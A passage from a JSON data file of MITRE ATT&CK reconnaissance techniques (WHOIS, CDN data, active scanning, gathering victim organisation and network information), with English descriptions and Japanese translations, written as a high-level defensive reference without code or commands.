                        "description_eng": "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関するコンテンツ配信ネットワーク（CDN）データを検索する可能性があります。CDNにより、組織は分散型負荷分散サーバーアレイからコンテンツをホストできます。CDNはまた、組織がリクエスターの地理的地域に基づいてコンテンツ配信をカスタマイズできるようにする場合もあります。\n\n敵対者は、実用的な情報を収集するためにCDNデータを検索するかもしれません。脅威アクターは、オンラインリソースやルックアップツールを使用して、CDN内のコンテンツサーバーに関する情報を収集することができます。敵対者はまた、機密情報を漏洩させたり、組織のウェブサイトでホストされているコンテンツと同じ保護メカニズム（ログインポータルなど）を持たないCDNの設定ミスを標的にしたりする可能性もあります。(引用：DigitalShadows CDN) これらの情報源からの情報は、他の形態の偵察（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595)または[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）、運用リソースの確立（例：[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)または[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）、および/または初期アクセス（例：[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)）の機会を明らかにする可能性があります。"
                    },
                    {
                        "id": "T1596.002",
                        "name_eng": "WHOIS",
                        "name_jp": "WHOIS",
                        "description_eng": "Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報について、公開WHOISデータを検索する可能性があります。WHOISデータは、ドメイン名などのインターネットリソースを割り当ておよび割り当てる責任を負う地域インターネットレジストリ（RIR）によって保存されます。誰でもWHOISサーバーに登録済みドメインに関する情報（割り当て済みIPブロック、連絡先情報、DNSネームサーバーなど）を照会できます。(引用: WHOIS)\n\n敵対者は、実用的な情報を収集するためにWHOISデータを検索するかもしれません。脅威アクターは、オンラインリソースやコマンドラインユーティリティを使用して、潜在的な被害者に関する情報をWHOISデータから略奪することができます。これらの情報源からの情報は、他の形態の偵察（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595)または[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)）、運用リソースの確立（例：[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)または[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)または[信頼できる関係](https://attack.mitre.org/techniques/T1199)）の機会を明らかにする可能性があります。"
                    }
                ]
            },
            {
                "id": "T1595",
                "name_eng": "Active Scanning",
                "name_jp": "アクティブスキャン",
                "description_eng": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
                "description_jp": "攻撃者は、ターゲティング中に使用できる情報を収集するために、アクティブな偵察スキャンを実行する可能性があります。アクティブスキャンとは、直接的な対話を伴わない他の形式の偵察とは対照的に、攻撃者がネットワークトラフィックを介して被害者のインフラストラクチャを調査するものです。\n\n敵対者は、収集しようとする情報に応じて、さまざまな形式のアクティブスキャンを実行する可能性があります。これらのスキャンはまた、ICMPなどのネットワークプロトコルのネイティブ機能を使用するなど、さまざまな方法で実行できます。(引用: Botnet Scan)(引用: OWASP Fingerprinting) これらのスキャンからの情報は、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[外部リモートサービス](https://attack.mitre.org/techniques/T1133)や[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)など）の機会を明らかにする可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1595.003",
                        "name_eng": "Wordlist Scanning",
                        "name_jp": "ワードリストスキャン",
                        "description_eng": "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",
                        "description_jp": "攻撃者は、ブルートフォースおよびクローリング技術を使用してインフラストラクチャを繰り返し調査する可能性があります。この技術は[ブルートフォース](https://attack.mitre.org/techniques/T1110)と同様の方法を用いますが、その目的は有効な資格情報の発見ではなく、コンテンツとインフラストラクチャの特定です。これらのスキャンで使用されるワードリストには、一般的でよく使用される名前やファイル拡張子、または特定のソフトウェアに固有の用語が含まれる場合があります。攻撃者はまた、他の偵察技術（例：[被害組織情報の収集](https://attack.mitre.org/techniques/T1591)、または[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）から収集されたデータを使用して、カスタムのターゲット固有のワードリストを作成する場合があります。\n\n例えば、攻撃者はDirb、DirBuster、GoBusterなどのWebコンテンツ発見ツールや、一般的またはカスタムのワードリストを使用して、Webサイトのページやディレクトリを列挙する可能性があります。(引用: ClearSky Lebanese Cedar Jan 2021) これにより、古い脆弱なページや、さらなる操作の標的となる可能性のある隠された管理ポータル（例：[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)または[ブルートフォース](https://attack.mitre.org/techniques/T1110)）を発見するのに役立つ可能性があります。\n\nクラウドストレージソリューションは通常、グローバルに一意な名前を使用するため、攻撃者はターゲット固有のワードリストやs3reconやGCPBucketBruteなどのツールを使用して、クラウドインフラストラクチャ上のパブリックおよびプライベートバケットを列挙することもできます。(引用: S3Recon GitHub)(引用: GCPBucketBrute) ストレージオブジェクトが発見されると、攻撃者は[クラウドストレージからのデータ](https://attack.mitre.org/techniques/T1530)を利用して、持ち出したり権限を昇格させたり横方向に移動したりするために使用できる貴重な情報にアクセスする可能性があります。"
                    },
                    {
                        "id": "T1595.001",
                        "name_eng": "Scanning IP Blocks",
                        "name_jp": "IPブロックのスキャン",
                        "description_eng": "Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる情報を収集するために、被害者のIPブロックをスキャンする可能性があります。パブリックIPアドレスは、ブロック単位、つまり連続したアドレスの範囲で組織に割り当てられる場合があります。\n\n敵対者は、アクティブに使用されているIPアドレスや、これらのアドレスが割り当てられているホストに関するより詳細な情報など、[被害者ネットワーク情報の収集](https://attack.mitre.org/techniques/T1590)のためにIPブロックをスキャンする可能性があります。スキャンは、単純なping（ICMP要求と応答）から、サーバーバナーやその他のネットワークアーティファクトを介してホストソフトウェア/バージョンを明らかにする可能性のある、より微妙なスキャンまでさまざまです。(引用: Botnet Scan) これらのスキャンからの情報は、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など）の機会を明らかにする可能性があります。"
                    },
                    {
                        "id": "T1595.002",
                        "name_eng": "Vulnerability Scanning",
                        "name_jp": "脆弱性スキャン",
                        "description_eng": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる脆弱性について被害者をスキャンする可能性があります。脆弱性スキャンは通常、ターゲットホスト/アプリケーションの構成（ソフトウェアやバージョンなど）が、攻撃者が使用しようとする特定の悪用のターゲットと潜在的に一致するかどうかを確認します。\n\nこれらのスキャンには、より一般的に知られている悪用可能な脆弱性を特定するために使用できる[被害者ホスト情報の収集](https://attack.mitre.org/techniques/T1592)のより広範な試みが含まれる場合もあります。脆弱性スキャンは通常、サーバーバナー、リスニングポート、またはその他のネットワークアーティファクトを介して実行中のソフトウェアとバージョン番号を収集します。(引用: OWASP Vuln Scanning) これらのスキャンからの情報は、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)など）の機会を明らかにする可能性があります。"
                    }
                ]
            },
            {
                "id": "T1591",
                "name_eng": "Gather Victim Org Information",
                "name_jp": "被害組織情報の収集",
                "description_eng": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "description_jp": "攻撃者は、ターゲティング中に使用できる被害者の組織に関する情報を収集する可能性があります。組織に関する情報には、部門/部署名、事業運営の詳細、主要な従業員の役割と責任など、さまざまな詳細が含まれる場合があります。\n\n敵対者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法でこの情報を収集する可能性があります。組織に関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)や[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して攻撃者に公開される場合もあります。(引用: ThreatPost Broadvoice Leak)(引用: SEC EDGAR Search) この情報を収集すると、他の形式の偵察（[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)など）、運用リソースの確立（[アカウントの確立](https://attack.mitre.org/techniques/T1585)や[アカウントの侵害](https://attack.mitre.org/techniques/T1586)など）、および/または初期アクセス（[フィッシング](https://attack.mitre.org/techniques/T1566)や[信頼できる関係](https://attack.mitre.org/techniques/T1199)など）の機会が明らかになる可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1591.002",
                        "name_eng": "Business Relationships",
                        "name_jp": "ビジネス関係",
                        "description_eng": "Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のビジネス関係に関する情報を収集する可能性があります。組織のビジネス関係に関する情報には、接続された（そして潜在的に昇格された）ネットワークアクセスを持つセカンドパーティまたはサードパーティの組織/ドメイン（マネージドサービスプロバイダー、請負業者など）を含むさまざまな詳細が含まれる場合があります。この情報はまた、被害者のハードウェアおよびソフトウェアリソースのサプライチェーンと出荷経路を明らかにする可能性もあります。\n\n敵対者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法でこの情報を収集する可能性があります。ビジネス関係に関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)や[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して攻撃者に公開される場合もあります。(引用: ThreatPost Broadvoice Leak) この情報を収集すると、他の形式の偵察（[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)など）、運用リソースの確立（[アカウントの確立](https://attack.mitre.org/techniques/T1585)や[アカウントの侵害](https://attack.mitre.org/techniques/T1586)など）、および/または初期アクセス（[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)、[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)、または[信頼できる関係](https://attack.mitre.org/techniques/T1199)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1591.001",
                        "name_eng": "Determine Physical Locations",
                        "name_jp": "物理的な場所の特定",
                        "description_eng": "Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者の物理的な場所を収集する可能性があります。ターゲット組織の物理的な場所に関する情報には、主要なリソースやインフラストラクチャが収容されている場所など、さまざまな詳細が含まれる場合があります。物理的な場所はまた、被害者が活動している法管轄区域や当局を示す場合もあります。\n\n敵対者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法でこの情報を収集する可能性があります。ターゲット組織の物理的な場所はまた、オンラインまたはその他のアクセス可能なデータセット（[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)や[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)など）を介して攻撃者に公開される場合もあります。(引用: ThreatPost Broadvoice Leak)(引用: SEC EDGAR Search) この情報を収集すると、他の形式の偵察（[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[フィッシング](https://attack.mitre.org/techniques/T1566)や[ハードウェア追加](https://attack.mitre.org/techniques/T1200)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1591.004",
                        "name_eng": "Identify Roles",
                        "name_jp": "役割の特定",
                        "description_eng": "Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害組織内のIDと役割に関する情報を収集する可能性があります。ビジネスの役割に関する情報は、主要な人員の識別可能な情報や、彼らがアクセスできるデータ/リソースなど、さまざまなターゲット可能な詳細を明らかにする可能性があります。\n\n敵対者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法でこの情報を収集する可能性があります。ビジネスの役割に関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)や[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して攻撃者に公開される場合もあります。(引用: ThreatPost Broadvoice Leak) この情報を収集すると、他の形式の偵察（[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)など）、運用リソースの確立（[アカウントの確立](https://attack.mitre.org/techniques/T1585)や[アカウントの侵害](https://attack.mitre.org/techniques/T1586)など）、および/または初期アクセス（[フィッシング](https://attack.mitre.org/techniques/T1566)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1591.003",
                        "name_eng": "Identify Business Tempo",
                        "name_jp": "ビジネスのテンポの特定",
                        "description_eng": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のビジネステンポに関する情報を収集する可能性があります。組織のビジネステンポに関する情報には、営業時間/曜日など、さまざまな詳細が含まれる場合があります。この情報はまた、被害者のハードウェアおよびソフトウェアリソースの購入および出荷の時期/日付を明らかにする可能性もあります。\n\n敵対者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法でこの情報を収集する可能性があります。ビジネステンポに関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)や[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して攻撃者に公開される場合もあります。(引用: ThreatPost Broadvoice Leak) この情報を収集すると、他の形式の偵察（[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)など）、運用リソースの確立（[アカウントの確立](https://attack.mitre.org/techniques/T1585)や[アカウントの侵害](https://attack.mitre.org/techniques/T1586)など）、および/または初期アクセス（[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)や[信頼できる関係](https://attack.mitre.org/techniques/T1199)など）の機会が明らかになる可能性があります。"
                    }
                ]
            },
            {
                "id": "T1590",
                "name_eng": "Gather Victim Network Information",
                "name_jp": "被害者ネットワーク情報の収集",
                "description_eng": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のネットワークに関する情報を収集する可能性があります。ネットワークに関する情報には、管理データ（IP範囲、ドメイン名など）や、そのトポロジと運用に関する詳細など、さまざまな詳細が含まれる場合があります。\n\n攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接収集アクションを介して、さまざまな方法でこの情報を収集する可能性があります。ネットワークに関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）を介して攻撃者に公開される場合もあります。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS) この情報を収集すると、他の形式の偵察（[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)など）、運用リソースの確立（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)や[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)など）、および/または初期アクセス（[信頼できる関係](https://attack.mitre.org/techniques/T1199)など）の機会が明らかになる可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1590.001",
                        "name_eng": "Domain Properties",
                        "name_jp": "ドメインプロパティ",
                        "description_eng": "Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
